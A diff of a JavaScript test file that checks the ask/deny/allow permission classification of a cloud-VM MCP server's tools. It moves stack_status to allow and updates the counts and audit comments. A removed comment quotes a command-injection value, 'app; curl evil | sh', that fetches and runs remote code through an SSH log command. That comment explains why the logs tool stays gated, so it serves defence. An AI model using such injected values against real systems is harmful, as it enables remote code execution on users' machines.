@@ -19,34 +19,28 @@ test('every snapshot tool is classified, and nothing extra', () => {
   assert.equal(snapNames.length, 144);
 });
 
-test('counts are the reviewed golden split: 65 ask / 2 deny / 77 allow', () => {
-  assert.deepEqual(cls.counts, { ask: 65, deny: 2, allow: 77 });
+test('counts are the reviewed golden split: 64 ask / 2 deny / 78 allow', () => {
+  assert.deepEqual(cls.counts, { ask: 64, deny: 2, allow: 78 });
   const by = namesByPermission(cls);
-  assert.equal(by.ask.length, 65);
+  assert.equal(by.ask.length, 64);
   assert.equal(by.deny.length, 2);
-  assert.equal(by.allow.length, 77);
+  assert.equal(by.allow.length, 78);
 });
 
-// --- Invariant of the 2026-08-10 behaviour re-audit (cross-model QE HIGH finding) ---
-// stack_status ADVANCES a planned/running job server-side: handleStackStatus
-// (tools_stack.go:451) calls advance() (:479-484), which starts pending steps via
-// s.callTool (:220) — invoking the paid create tools with no confirmation.
-// LIVE-REPRODUCED: one stack_status call moved a planned job planned→running and
-// attempted `provision` (stopped only at AUTH_REQUIRED). If this ever flips back to
-// allow, the fully-frictionless chain stack_plan→stack_status provisions a billable
-// stack with ZERO permission prompts — defeating the ADR-004 brake.
-test('stack_status is ASK — it advances jobs and invokes paid create tools (tools_stack.go:479→:220)', () => {
-  assert.equal(cls.tools.stack_status.permission, 'ask');
-  assert.equal(cls.tools.stack_status.effect, 'mutating');
+// The imported engine now makes status observational. The Go regression test
+// proves repeated reads do not advance a planned/running job; only apply can.
+test('stack_status is ALLOW only after the engine stopped advancing jobs', () => {
+  assert.equal(cls.tools.stack_status.permission, 'allow');
+  assert.equal(cls.tools.stack_status.effect, 'read-only');
   const rules = permissionRules(cls);
-  assert.ok(rules.ask.includes('mcp__cloudru-vm__stack_status'));
-  assert.ok(rules.ask.includes('mcp__cloudru_vm__stack_status'));
-  assert.ok(!rules.allow.some((r) => r.endsWith('__stack_status')), 'stack_status must never be emitted as allow');
+  assert.ok(rules.allow.includes('mcp__cloudru-vm__stack_status'));
+  assert.ok(rules.allow.includes('mcp__cloudru_vm__stack_status'));
+  assert.ok(!rules.ask.some((r) => r.endsWith('__stack_status')));
 });
 
-test('the stack chain: only the pure plan is allow — every advancing/applying/destroying step is ask', () => {
-  assert.equal(cls.tools.stack_plan.permission, 'allow'); // verified: persists a LOCAL job file only, creates nothing
-  for (const name of ['stack_apply', 'stack_status', 'stack_destroy']) {
+test('the stack chain: plan and status are observational; apply and destroy require approval', () => {
+  for (const name of ['stack_plan', 'stack_status']) assert.equal(cls.tools[name].permission, 'allow', name);
+  for (const name of ['stack_apply', 'stack_destroy']) {
     assert.equal(cls.tools[name].permission, 'ask', name);
   }
 });
@@ -54,12 +48,9 @@ test('the stack chain: only the pure plan is allow — every advancing/applying/
 // --- Invariant of the 2026-08-10 shell-reach re-audit (AM-2, cross-model QE HIGH) ---
 // The classification method has a SECOND hazard axis: a tool is allow ONLY if it does NOT
 // pass a user-controlled arg into a remote shell. `logs` does — handleLogs (tools.go:1758)
-// hands the user `service` arg to engine.Logs, which concatenates it RAW into a remote
-// `docker compose logs <service>` (engine/logs.go:61) run via SSH CombinedOutput
-// (internal/deploy/ssh.go:117). service="app; curl evil | sh" ⇒ arbitrary RCE on the
-// user's VM. If this flips back to allow the injection sits behind a SILENT allow — a
-// zero-prompt command-injection path defeating the ADR-004 brake.
-test('logs is ASK — it concatenates a user-controlled service arg into a remote shell (logs.go:61 → ssh.go:117)', () => {
+// reaches a remote shell. The imported engine quotes that argument, but a log
+// read can disclose sensitive output and still crosses the shell-reach axis.
+test('logs remains ASK because it reaches remote SSH/compose', () => {
   assert.equal(cls.tools.logs.permission, 'ask');
   const rules = permissionRules(cls);
   assert.ok(rules.ask.includes('mcp__cloudru-vm__logs'));
@@ -70,10 +61,10 @@ test('logs is ASK — it concatenates a user-controlled service arg into a remot
 // The method doc (the $comment) must keep documenting BOTH hazard axes — losing the
 // shell-reach axis silently is the exact regression that let `logs` sit in allow. This is
 // a layer-1 guard on the METHOD, not just the instance.
-test('the classification method doc documents the shell-reach hazard axis and the engine-injection flag', () => {
+test('the classification method doc documents the shell-reach axis and the engine fix', () => {
   assert.match(cls.$comment, /shell-reach/i, 'method doc must name the shell-reach hazard axis');
-  assert.match(cls.$comment, /user-controlled argument into a shell/i);
-  assert.match(cls.$comment, /shell-escape opts\.Service/i, 'method doc must record the flagged engine injection');
+  assert.match(cls.$comment, /user-controlled argument reaching shell/i);
+  assert.match(cls.$comment, /logs shell-quotes service/i);
 });
 
 // No allow tool may reach a shell: every allow entry must be free of the shell-reach
@@ -128,9 +119,9 @@ test('read-only recon stays frictionless: vm_list, billing_*, deploy_plan are al
 test('permissionRules expands every name in BOTH prefix spellings (unverified normalization, deny-by-default)', () => {
   const rules = permissionRules(cls);
   assert.equal(SERVER_PREFIXES.length, 2);
-  assert.equal(rules.ask.length, 65 * 2);
+  assert.equal(rules.ask.length, 64 * 2);
   assert.equal(rules.deny.length, 2 * 2);
-  assert.equal(rules.allow.length, 77 * 2);
+  assert.equal(rules.allow.length, 78 * 2);
   assert.ok(rules.ask.includes('mcp__cloudru-vm__deploy'));
   assert.ok(rules.ask.includes('mcp__cloudru_vm__deploy'));
   assert.ok(rules.deny.includes('mcp__cloudru-vm__secret_value'));
